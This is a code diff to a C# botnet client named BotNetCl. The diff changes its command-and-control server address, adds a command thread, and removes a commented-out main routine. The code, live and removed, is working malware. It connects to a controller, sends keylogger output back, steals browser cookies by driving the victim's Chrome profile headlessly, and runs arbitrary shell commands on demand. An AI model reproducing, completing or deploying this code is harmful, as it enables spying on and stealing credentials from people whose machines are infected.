@@ -25,6 +25,7 @@ namespace BotNetCl
         private const int PORT_NUMBER = 9669;
         static Thread th_doKeylogger;
         static Thread th_socket;
+        static Thread th_cmd;
 
         static ASCIIEncoding encoding = new ASCIIEncoding();
         [DllImport("user32.dll")]
@@ -455,8 +456,6 @@ namespace BotNetCl
             }
             else if (command.StartsWith("keylogger"))
             {
-                UnhookWindowsHookEx(_hookID);
-                _hookID = SetHook(_proc);
 
                 Console.WriteLine("gui keylogger");
                 sendFileSocket(client, "keylogger");
@@ -477,6 +476,7 @@ namespace BotNetCl
                 Console.WriteLine("gui command");
                 sendFileSocket(client, "cmd");
                 Console.WriteLine("gui xong command");
+             
 
             }
             else if (command.StartsWith("exit"))
@@ -506,7 +506,7 @@ namespace BotNetCl
                 TcpClient client = new TcpClient();
 
                 // 1. connect
-                client.Connect("192.168.50.121", PORT_NUMBER);
+                client.Connect("192.168.1.100", PORT_NUMBER);
                 Stream stream = client.GetStream();
                 Console.WriteLine("connect xong socket");
             
@@ -537,162 +537,7 @@ namespace BotNetCl
             th_socket.SetApartmentState(ApartmentState.STA);
             th_socket.Start();
         }
-        //public static void Main1(string[] args)
-        //{
-        //    // static Thread th_doKeylogger;
-        //    // static Thread th_socket;
-
-            
-
-
-        //    //getCommandPrompt();
-        //    //Console.WriteLine(RunCommandAndGetOutput("echo %username%"));
-        //    // connectsocket();
-        //    //_hookID = SetHook(_proc);
-        //    //System.Windows.Forms.Application.Run();
-        //    //string s = Console.ReadLine();
-        //    //Console.WriteLine("echo %username%");
-
-        //    // cookies tuong doi ok
-        //    // Console.Write("Enter url:");
-        //    //// https://www.instagram.com/
-
-        //    // string url = Console.ReadLine().Trim();
-
-        //    //string url1 = "https://www.instagram.com/";
-        //    //getCookies(url1);
-
-        //    //ctrl k ctrl d format code
-        //    // ctrl f5
-
-        //    //  connectsocket();
-
-
-        //    // System.Windows.Forms.Application.Run();
-
-
-        //    //<--------------------- set up get cookies-------------------------->
-        //    ChromeOptions options = new ChromeOptions();
-        //    string username = RunCommandAndGetOutput("echo %username%").Trim();
-        //    string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
-
-        //    // options.AddArguments("user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data");
-        //    //Console.WriteLine(path);
-        //    options.AddArguments(path, "headless");
-        //    // options.AddArgument("--enable - automation");
-        //    //, "--headless"
-        //    //options.AddArgument("headless");
-        //    // options.AddArgument("user-data-dir=C:/Users/[username]/AppData/Local/Google/Chrome/User Data");
-
-        //    IWebDriver driver = new ChromeDriver(options);
-        //    //<---------------------end get cookies-------------------------->
-        //    try
-        //    {
-        //        TcpClient client = new TcpClient();
-
-        //        // 1. connect
-        //        client.Connect("192.168.50.121", PORT_NUMBER);
-        //        Stream stream = client.GetStream();
-
-        //        //// 2. send
-        //        byte[] data;
-
-  
-        //        while (true)
-        //        {
-        //            data = new byte[BUFFER_SIZE];
-        //            stream.Read(data, 0, BUFFER_SIZE);
-        //            string command = encoding.GetString(data);
-
-        //            if (command.StartsWith("cookies"))
-        //            {
-        //                string url = command.Split('?')[1];
-        //                //Console.WriteLine("a");
-        //                //Console.WriteLine(url);
-        //                //Console.WriteLine("b");
-        //                getCookies(driver,url);
-        //                // data = new byte[BUFFER_SIZE];
-
-        //                // data = encoding.GetBytes("cookies tra ve");
-
-
-        //                ////
-        //                //string str = " cookies tra ve";
-        //                //data = encoding.GetBytes(str);
-        //                ////
-
-        //                //stream.Write(data, 0, data.Length);
-        //                sendFileSocket(client,"cookies");
-
-
-        //                Console.WriteLine("xong cookies");
-
-
-        //            }
-        //            else if (command.StartsWith("keylogger"))
-        //            {
-        //                //data = new byte[BUFFER_SIZE];
-        //                //data = encoding.GetBytes("keylogger tra ve");
-        //                //stream.Write(data, 0, data.Length);
-
-
-        //                //string str = " keylogger tra ve";
-
-        //                //data = encoding.GetBytes(str);
-        //                //stream.Write(data, 0, data.Length);
-
-        //                //Console.WriteLine("xong keylogger");
-        //                Console.WriteLine("sending keylogger");
-
-        //                sendFileSocket(client, "keylogger");
-
-
-        //                Console.WriteLine("xong keylogger");
-
-
-        //            }
-        //            else if (command.StartsWith("run cmd command"))
-        //            {
-        //                stream.Read(data, 0, BUFFER_SIZE);
-        //                string cmd = encoding.GetString(data);
-
-        //                RunCommandAndGetOutput(cmd);
-
-        //                sendFileSocket(client, "cookies");
-        //                Console.WriteLine("xong command");
-
-
-
-
-        //            }
-        //            else if (command.StartsWith("exit"))
-        //            {
-        //                //data = new byte[BUFFER_SIZE];
-        //                //data = encoding.GetBytes("keylogger tra ve");
-        //                //stream.Write(data, 0, data.Length);
-
-
-        //                string str = "done";
-
-        //                data = encoding.GetBytes(str);
-        //                stream.Write(data, 0, data.Length);
-        //                Console.WriteLine("xong keylogger");
-        //                client.Close();
-
-        //            }
-        //        }
-
-        //    }
-        //    catch (Exception ex)
-        //    {
-        //        Console.WriteLine("Error: " + ex);
-        //    }
-           
-        //}
-
-
     }
-
 }
 
 
